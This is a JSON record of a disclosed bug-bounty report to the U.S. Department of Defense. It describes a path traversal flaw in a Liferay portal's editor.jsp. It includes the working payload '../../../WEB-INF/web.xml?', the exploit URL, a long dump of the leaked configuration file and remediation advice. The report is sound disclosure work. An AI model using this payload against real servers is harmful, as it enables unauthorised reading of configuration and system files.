@@ -1,0 +1,118 @@
+{
+  "id": 217344,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTczNDQ=",
+  "url": "https://hackerone.com/reports/217344",
+  "title": "Path traversal on ████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-30T20:55:32.124Z",
+  "submitted_at": "2017-03-30T20:55:32.124Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "twicedi",
+    "url": "/twicedi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-04T15:23:01.052Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-01-30T22:21:29.546Z",
+  "team_member_agreed_on_going_public_at": "2019-10-04T15:23:00.964Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nThe web application hosted on the \"█████████\" domain is affected by a path traversal vulnerability that could permit to an attacker to include arbirtary files that are outside of the restricted directory.\n\n**Description:**\nThe affected handler is the \"/html/js/editor/editor.jsp\".\nThis handler receives, through the \"editorImpl\" parameter, an input from the user to construct a pathname that is intended to identify a file, but the web app does not properly neutralize \"dot-dot-slash (../)\" within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory as showed in the following example in which the web.xml configuration file is included:\n\nExample of payload:\n> ../../../WEB-INF/web.xml?\n\nURL: \n(Note: the last question mark char (\"?\") is necessary to exploit the vulnerability otherwise an error is triggered, with a full stacktrace) \n```\nhttps://████/html/js/editor/editor.jsp?editorImpl=../../../WEB-INF/web.xml?\n```\n\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nServer: Microsoft-IIS/8.5\nX-Powered-By: ASP.NET\nDate: Thu, 30 Mar 2017 20:24:43 GMT\nConnection: close\nContent-Length: 54193\n\n\n<?xml version=\"1.0\"?>\n\n<web-app xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" version=\"2.4\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\">\n\t<context-param>\n\t\t<param-name>contextClass</param-name>\n\t\t<param-value>com.liferay.portal.spring.context.PortalApplicationContext</param-value>\n\t</context-param>\n\t<context-param>\n\t\t<param-name>contextConfigLocation</param-name>\n\t\t<param-value/>\n\t</context-param>\n\t<context-param>\n\t\t<param-name>com.ibm.websphere.portletcontainer.PortletDeploymentEnabled</param-name>\n\t\t<param-value>false</param-value>\n\t</context-param>\n\t<filter>\n\t\t<filter-name>Absolute Redirects Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.absoluteredirects.AbsoluteRedirectsFilter</filter-class>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Audit Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.audit.AuditFilter</filter-class>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Auto Login Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.autologin.AutoLoginFilter</filter-class>\n\t</filter>\n\t<filter>\n\n[REDACTED...]\n\n\t<filter>\n\t\t<filter-name>GZip Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.gzip.GZipFilter</filter-class>\n\t</filter>\n\t<filter>\n\t\t<filter-name>GZip Filter - Theme PNG</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.gzip.GZipFilter</filter-class>\n\t\t<init-param>\n\t\t\t<param-name>url-regex-pattern</param-name>\n\t\t\t<param-value>.+/themes/.*/images/.*\\.png</param-value>\n\t\t</init-param>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Header Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.header.HeaderFilter</filter-class>\n\t\t<init-param>\n\t\t\t<param-name>url-regex-ignore-pattern</param-name>\n\t\t\t<param-value>.+/-/.+</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>Cache-Control</param-name>\n\t\t\t<param-value>max-age=315360000, public</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>Expires</param-name>\n\t\t\t<param-value>315360000</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>Vary</param-name>\n\t\t\t<param-value>Accept-Encoding</param-value>\n\t\t</init-param>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Header Filter - JSP</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.header.HeaderFilter</filter-class>\n\t\t<init-param>\n\t\t\t<param-name>url-regex-pattern</param-name>\n\t\t\t<param-value>.+/(barebone|css|everything|main)\\.jsp</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>Cache-Control</param-name>\n\t\t\t<param-value>max-age=315360000, public</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>Expires</param-name>\n\t\t\t<param-value>315360000</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>Vary</param-name>\n\t\t\t<param-value>Accept-Encoding</param-value>\n\t\t</init-param>\n\t</filter>\n\t\n[REDACTED...]\n\n\t<filter>\n\t\t<filter-name>Minifier Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.minifier.MinifierFilter</filter-class>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Minifier Filter - JSP</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.minifier.MinifierFilter</filter-class>\n\t\t<init-param>\n\t\t\t<param-name>url-regex-pattern</param-name>\n\t\t\t<param-value>.+/(barebone|css|everything|main)\\.jsp</param-value>\n\t\t</init-param>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Monitoring Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.monitoring.MonitoringFilter</filter-class>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Secure Main Servlet Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.secure.SecureFilter</filter-class>\n\t\t<init-param>\n\t\t\t<param-name>portal_property_prefix</param-name>\n\t\t\t<param-value>main.servlet.</param-value>\n\t\t</init-param>\n\t</filter>\n\t<filter>\n\t\t<filter-name>Session Id Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.sessionid.SessionIdFilter</filter-class>\n\t</filter>\n\t<filter>\n\t\t<filter-name>SSO CAS Filter</filter-name>\n\t\t<filter-class>com.liferay.portal.servlet.filters.sso.cas.CASFilter</filter-class>\n\t</filter>\n\t\n[REDACTED...]\n\n\t<filter-mapping>\n\t\t<filter-name>Sharepoint Filter</filter-name>\n\t\t<url-pattern>/sharepoint/_vti_bin/_vti_aut/author.dll</url-pattern>\n\t</filter-mapping>\n\t<filter-mapping>\n\t\t<filter-name>Sharepoint Filter</filter-name>\n\t\t<url-pattern>/sharepoint/_vti_bin/owssvr.dll</url-pattern>\n\t</filter-mapping>\n\t<filter-mapping>\n\t\t<filter-name>SSO CAS Filter</filter-name>\n\t\t<url-pattern>/c/portal/login</url-pattern>\n\t\t<dispatcher>REQUEST</dispatcher>\n\t\t<dispatcher>FORWARD</dispatcher>\n\t</filter-mapping>\n\t<filter-mapping>\n\t\t<filter-name>SSO CAS Filter</filter-name>\n\t\t<url-pattern>/c/portal/logout</url-pattern>\n\t\t<dispatcher>REQUEST</dispatcher>\n\t\t<dispatcher>FORWARD</dispatcher>\n\t</filter-mapping>\n\t<filter-mapping>\n\t\t<filter-name>SSO Ntlm Filter</filter-name>\n\t\t<url-pattern>/c/portal/login</url-pattern>\n\t\t<dispatcher>REQUEST</dispatcher>\n\t\t<dispatcher>FORWARD</dispatcher>\n\t</filter-mapping>\n\t<filter-mapping>\n\t\t<filter-name>SSO Ntlm Post Filter</filter-name>\n\t\t<url-pattern>/*</url-pattern>\n\t</filter-mapping>\n\t\n[REDACTED...]\n\t\n\t<filter-mapping>\n\t\t<filter-name>Monitoring Filter</filter-name>\n\t\t<url-pattern>/user/*</url-pattern>\n\t\t<dispatcher>REQUEST</dispatcher>\n\t\t<dispatcher>FORWARD</dispatcher>\n\t</filter-mapping>\n\t<filter-mapping>\n\t\t<filter-name>Monitoring Filter</filter-name>\n\t\t<url-pattern>/web/*</url-pattern>\n\t\t<dispatcher>REQUEST</dispatcher>\n\t\t<dispatcher>FORWARD</dispatcher>\n\t</filter-mapping>\n\t<listener>\n\t\t<listener-class>com.liferay.portal.spring.context.PortalContextLoaderListener</listener-class>\n\t</listener>\n\t<listener>\n\t\t<listener-class>com.liferay.portal.servlet.PortalSessionListener</listener-class>\n\t</listener>\n\t<listener>\n\t\t<listener-class>com.liferay.portal.kernel.servlet.PortletSessionListenerManager</listener-class>\n\t</listener>\n\t<listener>\n\t\t<listener-class>com.liferay.portal.kernel.servlet.SerializableSessionAttributeListener</listener-class>\n\t</listener>\n\t<listener>\n\t\t<listener-class>com.liferay.portal.servlet.SharedSessionAttributeListener</listener-class>\n\t</listener>\n\t<servlet>\n\t\t<servlet-name>Web Server Servlet</servlet-name>\n\t\t<servlet-class>mil.army.lwn.liferay.portal.webserver.WebServerServlet</servlet-class>\n\t\t<load-on-startup>2</load-on-startup>\n\t</servlet>\n\t<servlet>\n\t\t<servlet-name>Main Servlet</servlet-name>\n\t\t<servlet-class>com.liferay.portal.servlet.MainServlet</servlet-class>\n\t\t<init-param>\n\t\t\t<param-name>config</param-name>\n\t\t\t<param-value>/WEB-INF/struts-config.xml,/WEB-INF/struts-config-ext.xml</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>debug</param-name>\n\t\t\t<param-value>0</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>detail</param-name>\n\t\t\t<param-value>0</param-value>\n\t\t</init-param>\n\t\t<load-on-startup>1</load-on-startup>\n\t</servlet>\n\t<servlet>\n\t\t<servlet-name>Combo Servlet</servlet-name>\n\t\t<servlet-class>com.liferay.portal.servlet.ComboServlet</servlet-class>\n\t\t<load-on-startup>2</load-on-startup>\n\t</servlet>\n\t<servlet>\n\t\t<servlet-name>Display Chart</servlet-name>\n\t\t<servlet-class>com.liferay.portal.servlet.DisplayChartServlet</servlet-class>\n\t\t<load-on-startup>2</load-on-startup>\n\t</servlet>\n\t<servlet>\n\t\t<servlet-name>Facebook Servlet</servlet-name>\n\t\t<servlet-class>com.liferay.portal.facebook.FacebookServlet</servlet-class>\n\t\t<load-on-startup>2</load-on-startup>\n\t</servlet>\n\t<servlet>\n\t\t<servlet-name>Friendly URL Servlet - Private Group</servlet-name>\n\t\t<servlet-class>com.liferay.portal.servlet.FriendlyURLServlet</servlet-class>\n\t\t<init-param>\n\t\t\t<param-name>private</param-name>\n\t\t\t<param-value>true</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>user</param-name>\n\t\t\t<param-value>false</param-value>\n\t\t</init-param>\n\t\t<load-on-startup>2</load-on-startup>\n\t</servlet>\n\t<servlet>\n\t\t<servlet-name>Friendly URL Servlet - Private User</servlet-name>\n\t\t<servlet-class>com.liferay.portal.servlet.FriendlyURLServlet</servlet-class>\n\t\t<init-param>\n\t\t\t<param-name>private</param-name>\n\t\t\t<param-value>true</param-value>\n\t\t</init-param>\n\t\t<init-param>\n\t\t\t<param-name>user</param-name>\n\t\t\t<param-value>true</param-value>\n\t\t</init-param>\n\t\t<load-on-startup>2</load-on-startup>\n\t</servlet>\n\t\n[REDACTED...]\n\n\t<servlet>\n\t\t<servlet-name>XML-RPC Servlet</servlet-name>\n\t\t<servlet-class>com.liferay.portal.xmlrpc.XmlRpcServlet</servlet-class>\n\t\t<load-on-startup>2</load-on-startup>\n\t</servlet>\n\t<servlet>\n\t\t<servlet-name>Clean Up Servlet</servlet-name>\n\t\t<servlet-class>com.liferay.portal.servlet.CleanUpServlet</servlet-class>\n\t\t<load-on-startup>3</load-on-startup>\n\t</servlet>\n\t<servlet-mapping>\n\t\t<servlet-name>Main Servlet</servlet-name>\n\t\t<url-pattern>/c/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>Combo Servlet</servlet-name>\n\t\t<url-pattern>/combo/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>Display Chart</servlet-name>\n\t\t<url-pattern>/display_chart/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>Facebook Servlet</servlet-name>\n\t\t<url-pattern>/facebook/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>Friendly URL Servlet - Private Group</servlet-name>\n\t\t<url-pattern>/group/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>Friendly URL Servlet - Private User</servlet-name>\n\t\t<url-pattern>/user/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>Friendly URL Servlet - Public</servlet-name>\n\t\t<url-pattern>/web/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>Google Gadget Servlet</servlet-name>\n\t\t<url-pattern>/google_gadget/*</url-pattern>\n\t</servlet-mapping>\n\n[REDACTED...]\n\n\t<servlet-mapping>\n\t\t<servlet-name>Widget Servlet</servlet-name>\n\t\t<url-pattern>/widget/*</url-pattern>\n\t</servlet-mapping>\n\t<servlet-mapping>\n\t\t<servlet-name>XML-RPC Servlet</servlet-name>\n\t\t<url-pattern>/xmlrpc/*</url-pattern>\n\t</servlet-mapping>\n\t<session-config>\n\t\t<session-timeout>120</session-timeout>\n\t</session-config>\n\t<welcome-file-list>\n\t\t<welcome-file>index.html</welcome-file>\n\t\t<welcome-file>index.jsp</welcome-file>\n\t</welcome-file-list>\n\t<error-page>\n\t\t<error-code>404</error-code>\n\t\t<location>/errors/404.jsp</location>\n\t</error-page>\n\t<jsp-config>\n\t\t<taglib>\n\t\t\t<taglib-uri>http://displaytag.sf.net</taglib-uri>\n\t\t\t<taglib-location>/WEB-INF/tld/displaytag.tld</taglib-location>\n\t\t</taglib>\n\t\t<taglib>\n\t\t\t<taglib-uri>http://java.sun.com/jsp/jstl/core</taglib-uri>\n\t\t\t<taglib-location>/WEB-INF/tld/c.tld</taglib-location>\n\t\t</taglib>\n\t\t<taglib>\n\t\t\t<taglib-uri>http://java.sun.com/jsp/jstl/fmt</taglib-uri>\n\t\t\t<taglib-location>/WEB-INF/tld/fmt.tld</taglib-location>\n\t\t</taglib>\n\t\t<taglib>\n\t\t\t<taglib-uri>http://java.sun.com/jsp/jstl/functions</taglib-uri>\n\t\t\t<taglib-location>/WEB-INF/tld/fn.tld</taglib-location>\n\t\t</taglib>\n\n[REDACTED...]\n\n\t\t<taglib>\n\t\t\t<taglib-uri>http://struts.apache.org/tags-tiles</taglib-uri>\n\t\t\t<taglib-location>/WEB-INF/tld/struts-tiles.tld</taglib-location>\n\t\t</taglib>\n\t\t<taglib>\n\t\t\t<taglib-uri>http://struts.apache.org/tags-tiles-el</taglib-uri>\n\t\t\t<taglib-location>/WEB-INF/tld/struts-tiles-el.tld</taglib-location>\n\t\t</taglib>\n\t</jsp-config>\n\t<security-constraint>\n\t\t<web-resource-collection>\n\t\t\t<web-resource-name>/c/portal/protected</web-resource-name>\n\t\t\t<url-pattern>/c/portal/protected</url-pattern>\n\t\t\t<url-pattern>/ar/c/portal/protected</url-pattern>\n\t\n[REDACTED...]\n\n\n\t\t\t<http-method>GET</http-method>\n\t\t\t<http-method>POST</http-method>\n\t\t</web-resource-collection>\n\t\t<auth-constraint>\n\t\t\t<role-name>users</role-name>\n\t\t</auth-constraint>\n\t\t<user-data-constraint>\n\t\t\t<transport-guarantee>NONE</transport-guarantee>\n\t\t</user-data-constraint>\n\t</security-constraint>\n\t<login-config>\n\t\t<auth-method>FORM</auth-method>\n\t\t<realm-name>PortalRealm</realm-name>\n\t\t<form-login-config>\n\t\t\t<form-login-page>/c/portal/j_login</form-login-page>\n\t\t\t<form-error-page>/c/portal/j_login_error</form-error-page>\n\t\t</form-login-config>\n\t</login-config>\n\t<security-role>\n\t\t<role-name>users</role-name>\n\t</security-role>\n</web-app>\n```\n\n## Impact\nIt may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.\n\n## Step-by-step Reproduction Instructions\n\n1. It’s possible to insert a malicious string as the \"editorImpl\" parameter of the following handler to access files that are outside of the restricted directory:\n(Note: the last question mark char (\"?\") is necessary to exploit the vulnerability otherwise an error is triggered, with a full stacktrace) \n```\nhttps://██████████/html/js/editor/editor.jsp?editorImpl=../../../WEB-INF/web.xml?\n```\n\n## Suggested Mitigation/Remediation Actions\nIt is advisable to:\n- Prefer working without user input when using file system calls\n- Use indexes rather than actual portions of file names when templating or using language files \n- Ensure the user cannot supply all parts of the path – surround it with your path code\n- Validate the user’s input by only accepting known good – do not sanitize the data\n- Use chrooted jails and code access policies to restrict where the files can be obtained or saved to\n- If forced to use user input for file operations, normalize the input before using in file io API's\n\nI'm available for further clarification,\n\nBest,\nDavide",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 12,
+  "voters": [
+    "m4khn0",
+    "kashsec",
+    "base_64",
+    "0-1",
+    "eveeez",
+    "lumbridge",
+    "kshsh",
+    "armansameer",
+    "chieft3ch",
+    "diffusioned",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
